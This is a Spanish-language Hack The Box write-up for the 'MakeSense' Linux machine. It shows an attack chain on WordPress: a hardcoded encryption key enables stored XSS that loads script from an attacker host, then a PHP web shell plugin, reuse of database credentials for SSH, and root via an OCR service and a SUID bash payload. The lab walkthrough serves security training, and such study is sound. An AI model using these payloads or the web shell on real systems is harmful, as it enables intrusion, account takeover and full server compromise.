<!--
  ╔═══════════════════════════════════════════════════════════════╗
  ║   MakeSense HTB - Full Walkthrough (Linux, Medium, Season 11) ║
  ║   Sensitive data redacted                                    ║
  ╚═══════════════════════════════════════════════════════════════╝
-->

![MakeSense Banner](makesense.png)

# ◈ MakeSense <small>Linux · Medium · HTB Season 11</small>

[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![Hack The Box](https://img.shields.io/badge/HackTheBox-MakeSense-9cf)](https://www.hackthebox.com)
[![Season](https://img.shields.io/badge/Season-11-orange)]()

> **Guía completa y detallada para resolver la máquina MakeSense de Hack The Box (Season 11, dificultad Medium).**  
> El ataque explora una vulnerabilidad en un tema de WordPress que expone una clave de cifrado AES‑GCM en JavaScript, permitiendo inyectar XSS persistente para crear un usuario administrador. A partir de ahí, se sube un plugin malicioso para obtener ejecución remota de comandos (RCE), se extraen credenciales SSH desde `wp-config.php`, y se escala a root abusando de un servicio OCR interno que guarda código PHP ejecutable en el directorio web.

---

## 📑 Contenido

1. [Recon & WordPress Discovery](#1-recon--wordpress-discovery)  
2. [Clave de cifrado expuesta](#2-clave-de-cifrado-expuesta)  
3. [XSS → Creación de usuario administrador](#3-xss--creación-de-usuario-administrador)  
4. [Ejecución remota de comandos (RCE)](#4-ejecución-remota-de-comandos-rce)  
5. [Movimiento lateral – credenciales SSH](#5-movimiento-lateral--credenciales-ssh)  
6. [Escalada de privilegios vía OCR interno](#6-escalada-de-privilegios-vía-ocr-interno)  
7. [Lógica del exploit paso a paso](#-lógica-del-exploit-paso-a-paso)  
8. [Conclusión y lecciones](#-conclusión-y-lecciones)

---

## 1. Recon & WordPress Discovery

**🔍 Nmap · Gobuster · WPScan**

Un escaneo inicial revela solo los puertos `80` y `443`, con redirección a HTTPS. El servidor ejecuta **WordPress 7.0** con el tema personalizado `webagency`.

Durante el fuzzing se encuentran:

- `/wp-content/uploads/` → listado de directorios habilitado  
- `/wp-content/themes/webagency/` → código fuente del tema accesible

La inspección del tema revela un sistema de **grabación de voz** que utiliza el modelo Whisper (Transformers.js) en el cliente.

```bash
$ nmap -p- --open -sS -min-rate 5000 10.129.29.150 -Pn
$ gobuster dir -u https://makesense.htb -w /usr/share/wordlists/common.txt -k -t 50
$ wpscan --url https://makesense.htb --disable-tls-checks --enumerate u,vp,vt

▶ Se identifican los usuarios walter, admin y jake.
2. Clave de cifrado expuesta

🔑 Hardcoded AES‑GCM key en JavaScript

El archivo
/wp-content/themes/webagency/assets/js/whisper/whisper-wrapper.js
contiene una clave de cifrado estática:
javascript

// Symmetric encryption key (must match server-side)
const ENCRYPTION_KEY = 'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI';

Flujo de la aplicación:

    El cliente graba audio → se transcribe con Whisper → se genera un resumen.

    El payload ({transcription, summary}) se cifra con AES‑GCM usando esa clave.

    El backend (vía admin-ajax.php?action=save_voice_results) descifra y guarda el resultado sin sanitizar.

⚡ Vulnerabilidad: Podemos cifrar cualquier payload y enviarlo al backend; el contenido se almacenará tal cual, permitiendo inyectar código JavaScript (XSS) o PHP directamente en el campo transcription.
3. XSS → Creación de usuario administrador

🧨 Inyección de script mediante la funcionalidad de voz

Se construye un payload cifrado que contiene una etiqueta <script> con un código JavaScript malicioso.
javascript

// Fragmento del payload inyectado
payload = {
  "transcription": '<script src="http://<attacker_ip>:8000/x.js"></script>',
  "summary": "s"
};
// Se cifra con la clave extraída y se envía a admin-ajax.php

El script externo (x.js) realiza lo siguiente:

    Obtiene el nonce de creación de usuario desde /wp-admin/user-new.php.

    Envía una petición POST para crear un nuevo usuario con rol administrator.

Cuando el bot administrador visita la página que contiene el comentario malicioso, el XSS se ejecuta y el usuario pwn es creado.
bash

$ python3 exploit.py 10.129.29.150
# El script automatiza todo el proceso, incluido el servidor HTTP para servir x.js

✔ Usuario pwn con contraseña [REDACTED] creado.
4. Ejecución remota de comandos (RCE)

⚙️ Subida de plugin malicioso vía panel de administración

Con el usuario pwn ya logueado, se accede al panel de WordPress y se sube un plugin ZIP que contiene un simple web shell:
php

<?php
if(isset($_REQUEST['c'])) {
    echo '<pre>';
    system($_REQUEST['c']);
    echo '</pre>';
}
?>

La subida se realiza usando el formulario de instalación de plugins (/wp-admin/plugin-install.php?tab=upload). Una vez instalado, se puede ejecutar cualquier comando vía:
bash

$ curl -k "https://makesense.htb/wp-content/plugins/wshell/wshell.php?c=id"

✔ Se obtiene salida de id como www-data, confirmando RCE.
5. Movimiento lateral – credenciales SSH

🔐 Lectura de wp‑config.php y extracción de contraseña

Desde el shell RCE se lee el archivo /var/www/html/wp-config.php para obtener las credenciales de la base de datos.
php

// Extracción de la contraseña
define( 'DB_PASSWORD', '[REDACTED]' );

La contraseña de la base de datos resulta ser la misma que la del usuario walter del sistema. Con estas credenciales se logra acceso por SSH:
bash

$ sshpass -p '[REDACTED]' ssh walter@10.129.29.150
$ cat ~/user.txt
[REDACTED_USER_FLAG]

✔ Flag de usuario obtenida.
6. Escalada de privilegios vía OCR interno

🖼️ Abuso del servicio OCR para ejecutar código como root

El sistema ejecuta un servicio PHP en el puerto 127.0.0.1:8001 que realiza OCR (reconocimiento óptico de caracteres) sobre imágenes y guarda el texto extraído en archivos dentro del directorio web.

    El servicio está corriendo como root.

    Podemos subir una imagen que contenga código PHP claramente legible.

    El OCR extraerá ese texto y lo guardará en un archivo .php.

    Al acceder a ese archivo, el código se ejecutará con privilegios de root.

Se genera una imagen con el siguiente contenido:
php

<?php system('chmod +s /bin/bash'); ?>

La imagen se envía al OCR, que la procesa y guarda el texto en un archivo, por ejemplo, /var/www/html/saved/pwn.php.
Al ejecutar https://makesense.htb/saved/pwn.php, se otorgan permisos SUID a /bin/bash.
bash

$ /bin/bash -p
# cat /root/root.txt
[REDACTED_ROOT_FLAG]

✔ Flag de root obtenida.
🧩 Lógica del exploit paso a paso

Objetivo: Obtener ejecución de comandos como root en el servidor.

    Enumeración de superficie: Se detecta WordPress 7.0 con el tema webagency, que incluye funcionalidad de transcripción de voz mediante Whisper.

    Extracción de la clave de cifrado: El archivo whisper-wrapper.js contiene una clave AES‑GCM hardcodeada. Esto permite cifrar payloads arbitrarios que el backend descifrará y almacenará sin validación.

    Inyección de XSS persistente: Se envía un payload cifrado que contiene una etiqueta <script> que carga un archivo JS desde nuestro servidor. El backend guarda este script en el contenido de un post de WordPress (a través de la acción save_voice_results).

    Creación de usuario administrador: El script JS inyectado, al ser ejecutado por el bot administrador cuando visita la página, realiza una petición a /wp-admin/user-new.php con el nonce correspondiente y crea un usuario con rol administrator.

    Subida de plugin malicioso: Con el usuario administrador recién creado, se accede al panel de WordPress y se sube un plugin ZIP que contiene un web shell simple (wshell.php). Esto otorga ejecución remota de comandos como www-data.

    Extracción de credenciales: Desde el shell RCE, se lee /var/www/html/wp-config.php y se extrae la contraseña de la base de datos, que es reutilizada por el usuario del sistema walter.

    Acceso SSH: Con las credenciales de walter, se establece una conexión SSH y se lee la flag de usuario.

    Detección del servicio OCR interno: Se observa que en el puerto 127.0.0.1:8001 corre un servicio PHP que realiza OCR sobre imágenes y guarda el texto extraído en archivos ejecutables dentro del directorio web.

    Escalada por OCR: Se genera una imagen con el texto <?php system('chmod +s /bin/bash'); ?>. Se envía al servicio OCR, que procesa la imagen y guarda el código PHP en un archivo accesible desde la web.

    Ejecución como root: Al acceder a ese archivo PHP, se ejecuta el comando chmod +s /bin/bash, otorgando permisos SUID a la shell. Luego, con /bin/bash -p se obtiene una shell con privilegios de root y se lee la flag final.

💡 Clave del éxito: La combinación de una clave de cifrado expuesta, la capacidad de inyectar XSS persistente, y el uso de un servicio OCR mal configurado que guarda archivos ejecutables en la raíz web.

El script completo de Python (disponible en este repositorio) automatiza todas estas fases, incluyendo la generación de la imagen OCR, la interacción con el servicio interno y la recolección de flags.
🔮 Conclusión y lecciones

    Claves hardcodeadas en el lado cliente permiten cifrar payloads arbitrarios y engañar al backend.

    El XSS persistente sigue siendo un vector crítico cuando se combina con funcionalidades "legítimas".

    Un servicio OCR que guarda archivos ejecutables es una puerta abierta a la escalada de privilegios.

    La automatización (con Python) no solo ahorra tiempo, sino que obliga a comprender cada paso y a documentar el ataque.

El código completo del exploit (adaptado) está disponible en este repositorio, pero las flags y contraseñas han sido redactadas por razones obvias.

🛠️ Herramientas utilizadas: nmap, gobuster, wpscan, curl, sshpass, Python (requests, cryptography, PIL).
📎 Enlaces

    Hack The Box - MakeSense

    Mi perfil en Linktree — cosmenoide dev

    Guía para fines educativos · Hecho con ❤️


